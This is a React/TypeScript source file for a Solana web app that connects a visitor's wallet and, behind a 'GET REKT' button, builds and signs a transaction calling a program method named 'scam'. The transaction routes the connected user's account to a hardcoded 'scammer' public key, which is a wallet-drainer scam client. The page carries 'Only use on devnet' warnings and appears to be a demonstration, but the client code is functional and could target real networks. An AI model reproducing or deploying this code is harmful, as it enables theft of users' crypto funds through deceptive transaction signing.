import { WalletAdapterNetwork } from "@solana/wallet-adapter-base";
import {
  ConnectionProvider,
  WalletProvider,
  useAnchorWallet,
  useWallet,
} from "@solana/wallet-adapter-react";
import {
  WalletModalProvider,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import {
  GlowWalletAdapter,
  PhantomWalletAdapter,
  SlopeWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
} from "@solana/wallet-adapter-wallets";
import { clusterApiUrl, Connection, Transaction } from "@solana/web3.js";
import React, { FC, ReactNode, useMemo } from "react";
import idl from "./problematic_dev.json";
import {
  Program,
  Provider,
  AnchorProvider,
  web3,
  BN,
  Wallet,
} from "@project-serum/anchor";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";

require("./App.css");
require("@solana/wallet-adapter-react-ui/styles.css");

const App: FC = () => {
  return (
    <Context>
      <Content />
    </Context>
  );
};
export default App;

const network = WalletAdapterNetwork.Devnet;

const Context: FC<{ children: ReactNode }> = ({ children }) => {
  // You can also provide a custom RPC endpoint.
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);

  // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking and lazy loading --
  // Only the wallets you configure here will be compiled into your application, and only the dependencies
  // of wallets that your users connect to will be loaded.
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new GlowWalletAdapter(),
      new SlopeWalletAdapter(),
      new SolflareWalletAdapter({ network }),
      new TorusWalletAdapter(),
    ],
    [network]
  );

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>{children}</WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
};

const Content: FC = () => {
  const wallet = useAnchorWallet();
  function getProvider() {
    if (!wallet) {
      return null;
    }

    const connection = new web3.Connection(
      clusterApiUrl("devnet"),
      "confirmed"
    );
    const provider = new AnchorProvider(connection, wallet, {
      preflightCommitment: "confirmed",
    });
    return provider;
  }

  async function scam() {
    const provider = getProvider();
    if (!provider) {
      return null;
    }
    const b = JSON.parse(JSON.stringify(idl));
    const program = new Program(b, idl.metadata.address, provider);

    try {
      let tx = await program.methods
        .scam()
        .accounts({
          rektAcc: provider.wallet.publicKey,
          scammer: new web3.PublicKey(
            "7DoSo1J4vP9v145b9RvXzUJNzTA5wPKQjZ9oG5nkffo5"
          ),
          tokenProgram: TOKEN_PROGRAM_ID,
          systemProgram: web3.SystemProgram.programId,
        })
        .transaction();

      const recent = await provider.connection.getLatestBlockhash();
      tx.feePayer = wallet?.publicKey;
      tx.recentBlockhash = recent.blockhash;
      tx.lastValidBlockHeight = recent.lastValidBlockHeight;
      let x = await wallet?.signTransaction(tx) as Transaction;
    
      await provider.connection.sendRawTransaction(x.serialize())

    } catch (err) {
      console.log("Transaction error: ", err);
    }
  }

  return (
    <div className="App">
        <p>Only use on devnet</p>
      <button onClick={scam}>GET REKT</button>
      <p>Only use on devnet</p>
      <WalletMultiButton />
    </div>
  );
};
